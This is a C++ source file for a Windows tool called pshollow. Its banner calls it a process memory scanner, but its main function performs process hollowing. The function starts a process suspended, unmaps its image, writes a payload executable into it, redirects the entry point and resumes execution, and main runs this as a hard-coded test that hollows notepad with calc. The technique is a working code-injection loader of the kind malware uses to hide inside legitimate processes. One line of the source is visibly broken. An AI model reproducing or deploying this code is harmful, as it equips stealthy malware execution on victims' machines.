//==============================================================================
//
//  pshollow.cpp
//
//==============================================================================
//  Guillaume Plante <codegp@icloud.com>
//  Code licensed under the GNU GPL v3.0. See the LICENSE file for details.
//==============================================================================

#include "stdafx.h"
#include "targetver.h"
#include "version.h"
#include "log.h"
#include "utils.h"
#include "win32.h"
#include "cmdline.h"

#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <Psapi.h>
#include <Aclapi.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <regex>
#include <cstdio>
#include <cstdarg>
#include <fstream>
#include <vector>

typedef enum ESearchInput {
	ESINPUT_NOTSET,
	ESINPUT_STRING,
	ESINPUT_FILE,
	ESINPUT_REGEX,
} ESearchInputT;

typedef enum ESearchMode {
	ESEARCH_NOTSET,
	ESEARCH_PID,
	ESEARCH_PNAME
} ESearchModeT;

void usage(CmdlineParser* inputParser) {
#ifdef PLATFORM_WIN64
	std::string platform_str = "for 64 bits platform";
	std::string name_str = "pshollow.exe";
#else
	std::string platform_str = "for 32 bits platform";
	std::string name_str = "pshollow32.exe";
#endif
	logmsgn("%s [options]\n", name_str.c_str());
	inputParser->DumpAllOptions();
	logmsgn("\n");
}

void banner() {
	std::string verstr = pshollow::version::GetAppVersion();
#ifdef PLATFORM_WIN64
	std::string platform_str = "for 64 bits platform";
	std::string name_str = "pshollow.exe";
#else
	std::string platform_str = "for 32 bits platform";
	std::string name_str = "pshollow32.exe";
#endif
	logmsgn("\n%s v%s - processes memory scan tool\n", name_str.c_str(), verstr.c_str());
	logmsgn("copyright (C) 1999-2023  Guillaume Plante\n");
	logmsgn("built on %s, %s\n\n", __TIMESTAMP__, platform_str.c_str());
}

bool IsRunningAsAdmin() {
	BOOL isAdmin = FALSE;
	HANDLE hToken = nullptr;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION elevation;
		DWORD dwSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
			isAdmin = elevation.TokenIsElevated;
		}
		CloseHandle(hToken);
	}
	return isAdmin == TRUE;
}

bool InjectViaProcessHollowing(const std::wstring& targetPath, const std::wstring& payloadPath) {
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		logerror("Failed to create process: %ls\n", targetPath.c_str());
		return false;
	}

	std::ifstream file(payloadPath, std::ios::binary | std::ios::ate);
	if (!file) {
		logerror("Failed to open payload: %ls\n", payloadPath.c_str());
		return false;
	}
	size_t fileSize = file.tellg();
	file.seekg(0);
	std::vector<char> buffer(fileSize);
	file.read(buffer.data(), fileSize);
	file.close();

	auto* dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
	auto* ntHeaders = (PIMAGE_NT_HEADERS)(buffer.data() + dosHeader->e_lfanew);
	auto ZwUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwUnmapViewOfSection");
	ZwUnmapViewOfSection(pi.hProcess, (PVOID)ntHeaders->OptionalHeader.ImageBase);

	LPVOID remoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase,
	
tHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!remoteImage) {
		logerror("VirtualAllocEx failed\n");
		return false;
	}

	WriteProcessMemory(pi.hProcess, remoteImage, buffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
		WriteProcessMemory(pi.hProcess, (LPVOID)((uintptr_t)remoteImage + section[i].VirtualAddress),
			buffer.data() + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
	}

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
	GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
	ctx.Rcx = (uintptr_t)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
	ctx.Eax = (uintptr_t)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	logmsg("Process hollowing completed.\n");
	return true;
}

void exit_error(int errorCode, bool wait=false, const char* message = nullptr) {
	if (message) logerror("exit_error %d: %s\n", errorCode, message);
	else logerror("exit_error %d\n", errorCode);
	if (wait) Sleep(3000);
	exit(errorCode);
}

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[]) {
#ifdef UNICODE
	char** argn = (char**)Convert::allocate_argnw(argc, argv);
#else
	char** argn = argv;
#endif
	CmdLineUtil::get()->initialize(argc, argn);
	CmdlineParser* inputParser = CmdLineUtil::get()->parser();

	SCmdlineOptValues optVerbose({ "-v", "--verbose" }, "verbose output", false, cmdlineOptTypes::Verbose);
	SCmdlineOptValues optHelp({ "-h", "--help" }, "Show help message", false, cmdlineOptTypes::Help);
	SCmdlineOptValues optProcessName({ "-n", "--name" }, "Search specific process: use process name", true, cmdlineOptTypes::ProcName);
	SCmdlineOptValues optProcessID({ "-p", "--pid" }, "Search specific process: use process ID", true, cmdlineOptTypes::ProcID);

	inputParser->addOption(optHelp);
	inputParser->addOption(optProcessName);
	inputParser->addOption(optProcessID);
	inputParser->addOption(optVerbose);

	bool showHelp = inputParser->isSet(optHelp);
	bool isVerboseMode = inputParser->isSet(optVerbose);
	std::string procID;
	DWORD dwPID = 0;
	ESearchModeT searchMode = ESEARCH_NOTSET;

	if (inputParser->get_option_argument(optProcessID, procID)) {
		searchMode = ESEARCH_PID;
		dwPID = atoi(procID.c_str());
	}

	if (showHelp) {
		usage(inputParser);
		return 0;
	}

	if (!IsRunningAsAdmin()) {
		logwarn("user doesn't have administrator privileges. some process are not accessible!\n");
	}

	// TEST RUN — replace with actual logic or CLI handling
	InjectViaProcessHollowing(L"C:\\Windows\\System32\\notepad.exe", L"C:\\Windows\\System32\\calc.exe");
	return 0;
}
